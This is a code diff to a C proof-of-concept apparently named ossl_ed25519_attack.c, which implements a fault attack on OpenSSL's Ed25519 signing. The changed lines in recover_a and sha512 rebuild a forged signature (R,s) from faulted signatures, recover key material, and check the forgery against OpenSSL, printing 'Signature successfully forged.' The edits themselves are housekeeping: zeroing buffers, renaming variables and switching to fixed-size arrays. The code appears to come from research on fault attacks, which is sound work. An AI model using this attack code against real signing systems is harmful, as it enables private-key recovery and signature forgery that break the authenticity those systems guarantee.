@@ -181,6 +181,7 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t fA, const mpz_t R, const mpz_t
 	pretty_print_v_mpz("New r =", nr);
 
 	// Calculate R = rB
+	memset(a_r, 0, sizeof(a_r));
 	mpz_export(a_r, NULL, -1, sizeof(uint8_t), 0, 0, nr);
 	{
 		// Use functions from openssl/crypto/ec/curve25519.c
@@ -206,18 +207,20 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t fA, const mpz_t R, const mpz_t
 
 	// Verify newly generated signature
 	int ret;
-	uint8_t sig[64];
+	uint8_t sig_forged[64];
 	uint8_t a_A[32];
-	mpz_export(sig, NULL, -1, sizeof(uint8_t), 0, 0, nR);
-	mpz_export(sig + 32, NULL, -1, sizeof(uint8_t), 0, 0, tmp);
+	memset(sig_forged, 0, sizeof(sig_forged));
+	memset(a_A, 0, sizeof(a_A));
+	mpz_export(sig_forged, NULL, -1, sizeof(uint8_t), 0, 0, nR);
+	mpz_export(sig_forged + 32, NULL, -1, sizeof(uint8_t), 0, 0, tmp);
 	mpz_export(a_A, NULL, -1, sizeof(uint8_t), 0, 0, A);
 
 	// Print forged signature
-	pretty_print("Forged signature (R,s) =", sig, sizeof(sig));
-	pretty_print("    R =", sig, sizeof(sig)/2);
-	pretty_print("    s =", sig + sizeof(sig)/2, sizeof(sig)/2);
+	pretty_print("Forged signature (R,s) =", sig_forged, sizeof(sig_forged));
+	pretty_print("    R =", sig_forged, sizeof(sig_forged)/2);
+	pretty_print("    s =", sig_forged + sizeof(sig_forged)/2, sizeof(sig_forged)/2);
 
-	ret = verify_ossl(sig, a_A, test_msg, sizeof(test_msg));
+	ret = verify_ossl(sig_forged, a_A, test_msg, sizeof(test_msg));
 	if (ret == 1)
 		pretty_print_text_col("Signature successfully forged.", PP_COL_GREEN);
 	else if (ret == 0)
@@ -270,11 +273,12 @@ int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_
 	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:sha512()}");
 	pretty_print_v_text("Computing SHA512");
 	
-	uint8_t *a_R, *a_A;
-	size_t a_R_len, a_A_len;
+	uint8_t a_R[32], a_A[32];
 
-	a_R = mpz_export(NULL, &a_R_len, -1, sizeof(uint8_t), 0, 0, R);
-	a_A = mpz_export(NULL, &a_A_len, -1, sizeof(uint8_t), 0, 0, A);
+	memset(a_R, 0, sizeof(a_R));
+	memset(a_A, 0, sizeof(a_A));
+	mpz_export(a_R, NULL, -1, sizeof(uint8_t), 0, 0, R);
+	mpz_export(a_A, NULL, -1, sizeof(uint8_t), 0, 0, A);
 
 	// OpenSSL SHA512
 	uint8_t a_h[SHA512_DIGEST_LENGTH];
@@ -286,8 +290,8 @@ int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_
 
 	// Compute hash
 	if (!EVP_DigestInit_ex(hash_ctx, EVP_sha512(), NULL)
-		|| !EVP_DigestUpdate(hash_ctx, a_R, a_R_len)
-		|| !EVP_DigestUpdate(hash_ctx, a_A, a_A_len)
+		|| !EVP_DigestUpdate(hash_ctx, a_R, sizeof(a_R))
+		|| !EVP_DigestUpdate(hash_ctx, a_A, sizeof(a_A))
 		|| !EVP_DigestUpdate(hash_ctx, m, m_len)
 		|| !EVP_DigestFinal_ex(hash_ctx, a_h, &h_len))
 		goto err;
@@ -295,14 +299,10 @@ int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_
 	mpz_import(h, h_len, -1, sizeof(uint8_t), 0, 0, a_h);
 
 	EVP_MD_CTX_free(hash_ctx);
-	free(a_R);
-	free(a_A);
 	pretty_print_cfg_rm();
 	return 1;
 
 err:
-	free(a_R);
-	free(a_A);
 	ERR_print_errors_fp(stderr);
 	pretty_print_cfg_rm();
 	return 0;
@@ -341,12 +341,11 @@ int main(int arc, char *argv[])
 		!EVP_PKEY_keygen(pctx, &pkey))
 		goto err;
 
-	// Print public key
+	// Backup public key because it may be faulted
 	EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);
-	pretty_print("Raw public key:", pub, pub_len);
 
-	// Backup pkey
-	pkey_backup = EVP_PKEY_dup(pkey);
+	// Print public key
+	pretty_print("Raw public key:", pub, pub_len);
 
 	// Sign message
 	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestSignInit.html
@@ -362,7 +361,7 @@ int main(int arc, char *argv[])
 		pretty_print_v_text("End Ed25519 sign");
 
 		// Print signature
-		pretty_print("Signature (R,s) = ", sig[sign_run], sig_len);
+		pretty_print("Signature (R,s) =", sig[sign_run], sig_len);
 		pretty_print("    R =", sig[sign_run], sig_len/2);
 		pretty_print("    s =", sig[sign_run] + sig_len/2, sig_len/2);
 
